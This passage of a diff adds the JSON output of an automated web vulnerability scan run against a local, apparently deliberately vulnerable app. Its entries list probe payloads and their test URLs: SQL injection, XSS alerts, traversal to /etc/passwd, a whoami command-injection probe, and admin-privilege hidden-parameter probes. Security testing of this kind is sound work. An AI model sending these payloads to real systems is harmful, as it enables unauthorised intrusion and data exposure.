+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/saveLoginIp",
+        "payload": "q=<script>alert(1)</script>",
+        "test_url": "http://localhost:3001/rest/saveLoginIp?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/saveLoginIp",
+        "payload": "file=../../etc/passwd",
+        "test_url": "http://localhost:3001/rest/saveLoginIp?file=..%2F..%2Fetc%2Fpasswd",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/saveLoginIp",
+        "payload": "cmd=whoami",
+        "test_url": "http://localhost:3001/rest/saveLoginIp?cmd=whoami",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/saveLoginIp",
+        "payload": "search=' OR SLEEP(5)--",
+        "test_url": "http://localhost:3001/rest/saveLoginIp?search=%27+OR+SLEEP%285%29--",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/api/Hints",
+        "payload": "id=1 OR 1=1",
+        "test_url": "http://localhost:3001/api/Hints?q=id%3D1+OR+1%3D1",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/api/Hints",
+        "payload": "q=<script>alert(1)</script>",
+        "test_url": "http://localhost:3001/api/Hints?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/api/Hints",
+        "payload": "file=../../etc/passwd",
+        "test_url": "http://localhost:3001/api/Hints?file=..%2F..%2Fetc%2Fpasswd",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/api/Hints",
+        "payload": "cmd=whoami",
+        "test_url": "http://localhost:3001/api/Hints?cmd=whoami",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/api/Hints",
+        "payload": "search=' OR SLEEP(5)--",
+        "test_url": "http://localhost:3001/api/Hints?search=%27+OR+SLEEP%285%29--",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/api/Challenges",
+        "payload": "id=1 OR 1=1",
+        "test_url": "http://localhost:3001/api/Challenges?q=id%3D1+OR+1%3D1",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/api/Challenges",
+        "payload": "q=<script>alert(1)</script>",
+        "test_url": "http://localhost:3001/api/Challenges?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/api/Challenges",
+        "payload": "file=../../etc/passwd",
+        "test_url": "http://localhost:3001/api/Challenges?file=..%2F..%2Fetc%2Fpasswd",
+        "ml_prediction": "unknown",
+        "response_prediction": "lfi",
+        "severity": "HIGH",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/api/Challenges",
+        "payload": "cmd=whoami",
+        "test_url": "http://localhost:3001/api/Challenges?cmd=whoami",
+        "ml_prediction": "unknown",
+        "response_prediction": "lfi",
+        "severity": "HIGH",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/api/Challenges",
+        "payload": "search=' OR SLEEP(5)--",
+        "test_url": "http://localhost:3001/api/Challenges?search=%27+OR+SLEEP%285%29--",
+        "ml_prediction": "unknown",
+        "response_prediction": "lfi",
+        "severity": "HIGH",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/api/Cards",
+        "payload": "id=1 OR 1=1",
+        "test_url": "http://localhost:3001/api/Cards?q=id%3D1+OR+1%3D1",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/api/Cards",
+        "payload": "q=<script>alert(1)</script>",
+        "test_url": "http://localhost:3001/api/Cards?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/api/Cards",
+        "payload": "file=../../etc/passwd",
+        "test_url": "http://localhost:3001/api/Cards?file=..%2F..%2Fetc%2Fpasswd",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/api/Cards",
+        "payload": "cmd=whoami",
+        "test_url": "http://localhost:3001/api/Cards?cmd=whoami",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/api/Cards",
+        "payload": "search=' OR SLEEP(5)--",
+        "test_url": "http://localhost:3001/api/Cards?search=%27+OR+SLEEP%285%29--",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/api/Feedbacks",
+        "payload": "id=1 OR 1=1",
+        "test_url": "http://localhost:3001/api/Feedbacks?q=id%3D1+OR+1%3D1",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/api/Feedbacks",
+        "payload": "q=<script>alert(1)</script>",
+        "test_url": "http://localhost:3001/api/Feedbacks?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/api/Feedbacks",
+        "payload": "file=../../etc/passwd",
+        "test_url": "http://localhost:3001/api/Feedbacks?file=..%2F..%2Fetc%2Fpasswd",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/api/Feedbacks",
+        "payload": "cmd=whoami",
+        "test_url": "http://localhost:3001/api/Feedbacks?cmd=whoami",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/api/Feedbacks",
+        "payload": "search=' OR SLEEP(5)--",
+        "test_url": "http://localhost:3001/api/Feedbacks?search=%27+OR+SLEEP%285%29--",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/2fa/setup",
+        "payload": "id=1 OR 1=1",
+        "test_url": "http://localhost:3001/rest/2fa/setup?q=id%3D1+OR+1%3D1",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/2fa/setup",
+        "payload": "q=<script>alert(1)</script>",
+        "test_url": "http://localhost:3001/rest/2fa/setup?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/2fa/setup",
+        "payload": "file=../../etc/passwd",
+        "test_url": "http://localhost:3001/rest/2fa/setup?file=..%2F..%2Fetc%2Fpasswd",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/2fa/setup",
+        "payload": "cmd=whoami",
+        "test_url": "http://localhost:3001/rest/2fa/setup?cmd=whoami",
+        "ml_prediction": "unknown",
+        "response_prediction": "reflected",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/2fa/setup",
+        "payload": "search=' OR SLEEP(5)--",
+        "test_url": "http://localhost:3001/rest/2fa/setup?search=%27+OR+SLEEP%285%29--",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/profile",
+        "payload": "id=1 OR 1=1",
+        "test_url": "http://localhost:3001/profile?q=id%3D1+OR+1%3D1",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/profile",
+        "payload": "q=<script>alert(1)</script>",
+        "test_url": "http://localhost:3001/profile?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/profile",
+        "payload": "file=../../etc/passwd",
+        "test_url": "http://localhost:3001/profile?file=..%2F..%2Fetc%2Fpasswd",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/profile",
+        "payload": "cmd=whoami",
+        "test_url": "http://localhost:3001/profile?cmd=whoami",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/profile",
+        "payload": "search=' OR SLEEP(5)--",
+        "test_url": "http://localhost:3001/profile?search=%27+OR+SLEEP%285%29--",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/api/SecurityQuestions",
+        "payload": "id=1 OR 1=1",
+        "test_url": "http://localhost:3001/api/SecurityQuestions?q=id%3D1+OR+1%3D1",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/api/SecurityQuestions",
+        "payload": "q=<script>alert(1)</script>",
+        "test_url": "http://localhost:3001/api/SecurityQuestions?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/api/SecurityQuestions",
+        "payload": "file=../../etc/passwd",
+        "test_url": "http://localhost:3001/api/SecurityQuestions?file=..%2F..%2Fetc%2Fpasswd",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/api/SecurityQuestions",
+        "payload": "cmd=whoami",
+        "test_url": "http://localhost:3001/api/SecurityQuestions?cmd=whoami",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/api/SecurityQuestions",
+        "payload": "search=' OR SLEEP(5)--",
+        "test_url": "http://localhost:3001/api/SecurityQuestions?search=%27+OR+SLEEP%285%29--",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/register",
+        "payload": "id=1 OR 1=1",
+        "test_url": "http://localhost:3001/register?q=id%3D1+OR+1%3D1",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/register",
+        "payload": "q=<script>alert(1)</script>",
+        "test_url": "http://localhost:3001/register?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/register",
+        "payload": "file=../../etc/passwd",
+        "test_url": "http://localhost:3001/register?file=..%2F..%2Fetc%2Fpasswd",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/register",
+        "payload": "cmd=whoami",
+        "test_url": "http://localhost:3001/register?cmd=whoami",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/register",
+        "payload": "search=' OR SLEEP(5)--",
+        "test_url": "http://localhost:3001/register?search=%27+OR+SLEEP%285%29--",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/string",
+        "payload": "id=1 OR 1=1",
+        "test_url": "http://localhost:3001/string?q=id%3D1+OR+1%3D1",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/string",
+        "payload": "q=<script>alert(1)</script>",
+        "test_url": "http://localhost:3001/string?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/string",
+        "payload": "file=../../etc/passwd",
+        "test_url": "http://localhost:3001/string?file=..%2F..%2Fetc%2Fpasswd",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/string",
+        "payload": "cmd=whoami",
+        "test_url": "http://localhost:3001/string?cmd=whoami",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/string",
+        "payload": "search=' OR SLEEP(5)--",
+        "test_url": "http://localhost:3001/string?search=%27+OR+SLEEP%285%29--",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/continue-code",
+        "payload": "id=1 OR 1=1",
+        "test_url": "http://localhost:3001/rest/continue-code?q=id%3D1+OR+1%3D1",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/continue-code",
+        "payload": "q=<script>alert(1)</script>",
+        "test_url": "http://localhost:3001/rest/continue-code?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/continue-code",
+        "payload": "file=../../etc/passwd",
+        "test_url": "http://localhost:3001/rest/continue-code?file=..%2F..%2Fetc%2Fpasswd",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/continue-code",
+        "payload": "cmd=whoami",
+        "test_url": "http://localhost:3001/rest/continue-code?cmd=whoami",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/continue-code",
+        "payload": "search=' OR SLEEP(5)--",
+        "test_url": "http://localhost:3001/rest/continue-code?search=%27+OR+SLEEP%285%29--",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/web3",
+        "payload": "id=1 OR 1=1",
+        "test_url": "http://localhost:3001/rest/web3?q=id%3D1+OR+1%3D1",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/web3",
+        "payload": "q=<script>alert(1)</script>",
+        "test_url": "http://localhost:3001/rest/web3?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/web3",
+        "payload": "file=../../etc/passwd",
+        "test_url": "http://localhost:3001/rest/web3?file=..%2F..%2Fetc%2Fpasswd",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/web3",
+        "payload": "cmd=whoami",
+        "test_url": "http://localhost:3001/rest/web3?cmd=whoami",
+        "ml_prediction": "unknown",
+        "response_prediction": "reflected",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/web3",
+        "payload": "search=' OR SLEEP(5)--",
+        "test_url": "http://localhost:3001/rest/web3?search=%27+OR+SLEEP%285%29--",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/chatbot",
+        "payload": "id=1 OR 1=1",
+        "test_url": "http://localhost:3001/rest/chatbot?q=id%3D1+OR+1%3D1",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/chatbot",
+        "payload": "q=<script>alert(1)</script>",
+        "test_url": "http://localhost:3001/rest/chatbot?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/chatbot",
+        "payload": "file=../../etc/passwd",
+        "test_url": "http://localhost:3001/rest/chatbot?file=..%2F..%2Fetc%2Fpasswd",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/chatbot",
+        "payload": "cmd=whoami",
+        "test_url": "http://localhost:3001/rest/chatbot?cmd=whoami",
+        "ml_prediction": "unknown",
+        "response_prediction": "reflected",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/chatbot",
+        "payload": "search=' OR SLEEP(5)--",
+        "test_url": "http://localhost:3001/rest/chatbot?search=%27+OR+SLEEP%285%29--",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/continue-code-findIt",
+        "payload": "id=1 OR 1=1",
+        "test_url": "http://localhost:3001/rest/continue-code-findIt?q=id%3D1+OR+1%3D1",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/continue-code-findIt",
+        "payload": "q=<script>alert(1)</script>",
+        "test_url": "http://localhost:3001/rest/continue-code-findIt?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/continue-code-findIt",
+        "payload": "file=../../etc/passwd",
+        "test_url": "http://localhost:3001/rest/continue-code-findIt?file=..%2F..%2Fetc%2Fpasswd",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/continue-code-findIt",
+        "payload": "cmd=whoami",
+        "test_url": "http://localhost:3001/rest/continue-code-findIt?cmd=whoami",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/continue-code-findIt",
+        "payload": "search=' OR SLEEP(5)--",
+        "test_url": "http://localhost:3001/rest/continue-code-findIt?search=%27+OR+SLEEP%285%29--",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "AI_XSS",
+        "endpoint": "http://localhost:3001/rest/continue-code/apply/",
+        "param": "userId",
+        "payload": "%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E",
+        "confidence_score": 100,
+        "severity": "HIGH"
+    },
+    {
+        "type": "AI_XSS",
+        "endpoint": "http://localhost:3001/rest/continue-code/apply/",
+        "param": "uid",
+        "payload": "%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E",
+        "confidence_score": 100,
+        "severity": "HIGH"
+    },
+    {
+        "type": "AI_XSS",
+        "endpoint": "http://localhost:3001/rest/user/login",
+        "param": "token",
+        "payload": "%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E",
+        "confidence_score": 100,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/admin",
+        "param": "admin",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/admin",
+        "param": "admin",
+        "payload": "yes",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/admin",
+        "param": "admin",
+        "payload": "1",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/admin",
+        "param": "isAdmin",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/admin",
+        "param": "isAdmin",
+        "payload": "yes",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/admin",
+        "param": "isAdmin",
+        "payload": "1",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/admin",
+        "param": "role",
+        "payload": "yes",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/admin",
+        "param": "role",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/admin",
+        "param": "role",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/admin",
+        "param": "debug",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/admin",
+        "param": "debug",
+        "payload": "yes",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/admin",
+        "param": "debug",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/admin",
+        "param": "access",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/admin",
+        "param": "access",
+        "payload": "1",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/admin",
+        "param": "access",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/admin",
+        "param": "privilege",
+        "payload": "1",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/admin",
+        "param": "privilege",
+        "payload": "yes",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/admin",
+        "param": "privilege",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/admin",
+        "param": "auth",
+        "payload": "1",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/admin",
+        "param": "auth",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/admin",
+        "param": "auth",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/admin",
+        "param": "token",
+        "payload": "1",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/admin",
+        "param": "token",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/admin",
+        "param": "token",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/continue-code/apply/",
+        "param": "admin",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/continue-code/apply/",
+        "param": "admin",
+        "payload": "yes",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/continue-code/apply/",
+        "param": "admin",
+        "payload": "1",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/continue-code/apply/",
+        "param": "isAdmin",
+        "payload": "1",
+        "confidence_score": 70,
